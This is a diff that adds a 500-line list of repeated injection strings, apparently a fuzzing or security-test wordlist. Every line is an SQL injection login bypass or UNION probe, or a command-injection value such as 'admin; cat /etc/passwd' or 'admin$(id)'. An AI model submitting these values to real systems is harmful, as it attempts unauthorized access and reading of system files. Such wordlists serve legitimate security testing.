@@ -1,0 +1,500 @@
+' OR 1=1--
+' OR 'x'='x
+admin | whoami
+admin' UNION SELECT NULL--
+' OR 1=1--
+admin && id
+' OR 1=1--
+admin' OR '1'='1
+admin' OR '1'='1
+admin$(id)
+admin'--
+admin'--
+admin`whoami`
+' OR 'x'='x
+admin$(id)
+' OR 'x'='x
+admin' OR '1'='1
+' OR 1=1--
+admin`whoami`
+admin'--
+admin') OR ('1'='1
+admin && id
+' OR 'x'='x
+admin`whoami`
+admin' UNION SELECT NULL--
+admin'--
+admin && id
+admin' UNION SELECT NULL--
+admin | whoami
+admin | whoami
+admin' OR '1'='1
+' OR 'x'='x
+' OR 1=1--
+admin') OR ('1'='1
+' OR 'x'='x
+admin && id
+admin' UNION SELECT NULL--
+admin' OR '1'='1
+admin' OR '1'='1
+admin; cat /etc/passwd
+admin | whoami
+admin | whoami
+admin') OR ('1'='1
+admin'--
+admin') OR ('1'='1
+' OR 'x'='x
+admin' OR '1'='1
+admin | whoami
+admin$(id)
+' OR 1=1--
+admin' UNION SELECT NULL--
+admin') OR ('1'='1
+admin'--
+admin && id
+admin' UNION SELECT NULL--
+admin' UNION SELECT NULL--
+admin' OR '1'='1
+admin$(id)
+' OR 1=1--
+' OR 1=1--
+admin && id
+' OR 1=1--
+admin') OR ('1'='1
+admin`whoami`
+admin | whoami
+' OR 1=1--
+admin | whoami
+admin' UNION SELECT NULL--
+admin && id
+admin`whoami`
+admin && id
+admin && id
+admin' OR '1'='1
+admin' OR '1'='1
+admin') OR ('1'='1
+admin' OR '1'='1
+admin' UNION SELECT NULL--
+admin' UNION SELECT NULL--
+admin' OR '1'='1
+' OR 'x'='x
+' OR 1=1--
+admin && id
+admin | whoami
+admin') OR ('1'='1
+admin') OR ('1'='1
+admin' UNION SELECT NULL--
+admin') OR ('1'='1
+admin') OR ('1'='1
+' OR 1=1--
+admin') OR ('1'='1
+' OR 'x'='x
+' OR 'x'='x
+admin$(id)
+admin' UNION SELECT NULL--
+admin' OR '1'='1
+' OR 1=1--
+admin' OR '1'='1
+admin`whoami`
+admin && id
+' OR 'x'='x
+admin && id
+admin; cat /etc/passwd
+admin') OR ('1'='1
+admin' UNION SELECT NULL--
+admin && id
+admin; cat /etc/passwd
+' OR 'x'='x
+' OR 1=1--
+admin') OR ('1'='1
+admin`whoami`
+admin'--
+' OR 1=1--
+' OR 1=1--
+' OR 'x'='x
+' OR 1=1--
+admin && id
+admin; cat /etc/passwd
+' OR 'x'='x
+' OR 1=1--
+admin$(id)
+admin; cat /etc/passwd
+admin') OR ('1'='1
+admin | whoami
+admin`whoami`
+admin'--
+admin' UNION SELECT NULL--
+' OR 'x'='x
+admin; cat /etc/passwd
+admin && id
+admin' OR '1'='1
+' OR 1=1--
+admin' OR '1'='1
+admin' UNION SELECT NULL--
+admin; cat /etc/passwd
+' OR 1=1--
+admin' UNION SELECT NULL--
+admin; cat /etc/passwd
+admin && id
+' OR 1=1--
+' OR 'x'='x
+' OR 'x'='x
+admin'--
+admin'--
+admin' OR '1'='1
+admin' UNION SELECT NULL--
+' OR 1=1--
+admin$(id)
+' OR 1=1--
+admin' OR '1'='1
+admin$(id)
+' OR 1=1--
+admin' UNION SELECT NULL--
+admin; cat /etc/passwd
+admin && id
+admin | whoami
+admin | whoami
+admin | whoami
+admin`whoami`
+admin'--
+' OR 'x'='x
+admin && id
+admin | whoami
+admin' UNION SELECT NULL--
+admin | whoami
+admin') OR ('1'='1
+admin'--
+admin'--
+' OR 1=1--
+admin; cat /etc/passwd
+admin | whoami
+admin; cat /etc/passwd
+' OR 1=1--
+admin'--
+admin'--
+admin; cat /etc/passwd
+admin') OR ('1'='1
+admin`whoami`
+admin'--
+admin | whoami
+' OR 'x'='x
+admin$(id)
+admin$(id)
+' OR 'x'='x
+' OR 1=1--
+' OR 1=1--
+admin') OR ('1'='1
+admin' OR '1'='1
+admin') OR ('1'='1
+admin | whoami
+admin'--
+admin') OR ('1'='1
+admin$(id)
+admin' OR '1'='1
+' OR 'x'='x
+admin$(id)
+admin' UNION SELECT NULL--
+admin' OR '1'='1
+admin') OR ('1'='1
+admin' OR '1'='1
+' OR 1=1--
+admin'--
+admin && id
+' OR 1=1--
+admin$(id)
+' OR 'x'='x
+admin' OR '1'='1
+' OR 'x'='x
+admin; cat /etc/passwd
+' OR 1=1--
+admin && id
+' OR 1=1--
+admin'--
+admin' OR '1'='1
+admin'--
+admin | whoami
+admin'--
+admin && id
+admin; cat /etc/passwd
+admin'--
+admin' UNION SELECT NULL--
+admin; cat /etc/passwd
+admin' UNION SELECT NULL--
+admin' UNION SELECT NULL--
+' OR 1=1--
+' OR 'x'='x
+admin') OR ('1'='1
+admin && id
+admin$(id)
+' OR 'x'='x
+admin && id
+admin' OR '1'='1
+' OR 'x'='x
+admin && id
+admin'--
+admin' UNION SELECT NULL--
+' OR 'x'='x
+admin' UNION SELECT NULL--
+admin`whoami`
+admin' UNION SELECT NULL--
+admin' OR '1'='1
+admin; cat /etc/passwd
+' OR 'x'='x
+admin'--
+admin | whoami
+admin; cat /etc/passwd
+' OR 1=1--
+' OR 1=1--
+admin && id
+admin$(id)
+' OR 'x'='x
+admin && id
+admin' OR '1'='1
+admin | whoami
+' OR 1=1--
+' OR 1=1--
+admin | whoami
+admin; cat /etc/passwd
+admin' UNION SELECT NULL--
+admin`whoami`
+admin') OR ('1'='1
+admin; cat /etc/passwd
+admin$(id)
+' OR 1=1--
+admin') OR ('1'='1
+admin'--
+admin' OR '1'='1
+admin$(id)
+admin' OR '1'='1
+admin && id
+' OR 'x'='x
+admin'--
+' OR 'x'='x
+admin | whoami
+admin | whoami
+admin; cat /etc/passwd
+admin | whoami
+admin'--
+admin$(id)
+admin' OR '1'='1
+admin$(id)
+admin && id
+admin$(id)
+admin'--
+' OR 1=1--
+admin' OR '1'='1
+admin' OR '1'='1
+admin$(id)
+admin`whoami`
+admin | whoami
+admin' UNION SELECT NULL--
+' OR 1=1--
+admin' OR '1'='1
+admin' UNION SELECT NULL--
+admin && id
+admin' UNION SELECT NULL--
+admin`whoami`
+admin`whoami`
+admin') OR ('1'='1
+admin`whoami`
+admin' OR '1'='1
+' OR 1=1--
+' OR 'x'='x
+admin$(id)
+admin; cat /etc/passwd
+admin; cat /etc/passwd
+admin' OR '1'='1
+admin' OR '1'='1
+admin' UNION SELECT NULL--
+admin'--
+admin; cat /etc/passwd
+admin | whoami
+admin`whoami`
+admin`whoami`
+admin; cat /etc/passwd
+admin; cat /etc/passwd
+admin' OR '1'='1
+admin`whoami`
+admin' UNION SELECT NULL--
+admin; cat /etc/passwd
+admin') OR ('1'='1
+admin'--
+admin$(id)
+admin' OR '1'='1
+admin'--
+admin') OR ('1'='1
+admin' UNION SELECT NULL--
+admin'--
+admin; cat /etc/passwd
+' OR 'x'='x
+admin$(id)
+admin$(id)
+admin`whoami`
+admin') OR ('1'='1
+admin | whoami
+admin'--
+admin' UNION SELECT NULL--
+admin') OR ('1'='1
+admin') OR ('1'='1
+admin && id
+admin' OR '1'='1
+admin$(id)
+admin$(id)
+' OR 1=1--
+' OR 1=1--
+admin' OR '1'='1
+' OR 'x'='x
+admin' OR '1'='1
+admin' UNION SELECT NULL--
+admin$(id)
+admin | whoami
+' OR 'x'='x
+' OR 1=1--
+admin; cat /etc/passwd
+admin && id
+admin' OR '1'='1
+admin`whoami`
+admin && id
+admin | whoami
+admin' OR '1'='1
+admin'--
+admin$(id)
+admin; cat /etc/passwd
+' OR 'x'='x
+admin`whoami`
+admin && id
+' OR 'x'='x
+' OR 1=1--
+admin && id
+admin && id
+admin$(id)
+admin | whoami
+admin') OR ('1'='1
+' OR 'x'='x
+admin'--
+admin && id
+admin$(id)
+admin') OR ('1'='1
+admin | whoami
+' OR 'x'='x
+admin' UNION SELECT NULL--
+admin' OR '1'='1
+admin') OR ('1'='1
+admin' UNION SELECT NULL--
+admin' UNION SELECT NULL--
+admin' UNION SELECT NULL--
+admin' OR '1'='1
+admin') OR ('1'='1
+admin; cat /etc/passwd
+admin`whoami`
+admin' OR '1'='1
+' OR 1=1--
+admin$(id)
+admin$(id)
+admin' UNION SELECT NULL--
+admin' UNION SELECT NULL--
+admin' OR '1'='1
+admin') OR ('1'='1
+admin && id
+admin') OR ('1'='1
+' OR 1=1--
+' OR 1=1--
+admin'--
+admin') OR ('1'='1
+admin && id
+admin && id
+admin' UNION SELECT NULL--
+admin`whoami`
+admin' OR '1'='1
+admin' UNION SELECT NULL--
+' OR 1=1--
+admin$(id)
+admin'--
+admin' UNION SELECT NULL--
+admin$(id)
+admin`whoami`
+admin`whoami`
+admin$(id)
+' OR 1=1--
+admin'--
+admin' UNION SELECT NULL--
+admin') OR ('1'='1
+' OR 'x'='x
+admin | whoami
+admin'--
+admin`whoami`
+' OR 1=1--
+' OR 'x'='x
+admin && id
+admin'--
+' OR 1=1--
+admin && id
+admin' OR '1'='1
+admin') OR ('1'='1
+admin' UNION SELECT NULL--
+admin | whoami
+admin; cat /etc/passwd
+admin`whoami`
+admin`whoami`
+admin') OR ('1'='1
+admin' UNION SELECT NULL--
+admin$(id)
+' OR 'x'='x
+admin' OR '1'='1
+' OR 'x'='x
+admin && id
+admin' OR '1'='1
+admin`whoami`
+admin$(id)
+admin') OR ('1'='1
+' OR 'x'='x
+admin'--
+admin`whoami`
+admin' UNION SELECT NULL--
+' OR 1=1--
+admin' UNION SELECT NULL--
+admin | whoami
+admin') OR ('1'='1
+admin') OR ('1'='1
+admin') OR ('1'='1
+admin && id
+admin' OR '1'='1
+admin$(id)
+admin' UNION SELECT NULL--
+admin' OR '1'='1
+' OR 1=1--
+admin | whoami
+admin; cat /etc/passwd
+admin' UNION SELECT NULL--
+' OR 'x'='x
+admin' OR '1'='1
+' OR 1=1--
+admin$(id)
+' OR 'x'='x
+' OR 'x'='x
+' OR 'x'='x
+admin') OR ('1'='1
+' OR 'x'='x
+admin$(id)
+' OR 1=1--
+admin && id
+admin`whoami`
+admin && id
+' OR 'x'='x
+admin$(id)
+admin$(id)
+' OR 1=1--
+' OR 'x'='x
+admin`whoami`
+admin') OR ('1'='1
+admin | whoami
+admin' OR '1'='1
+' OR 'x'='x
+admin' UNION SELECT NULL--
+admin'--
+admin' UNION SELECT NULL--
+admin' UNION SELECT NULL--
+admin$(id)
+admin' UNION SELECT NULL--
+' OR 1=1--
+admin$(id)
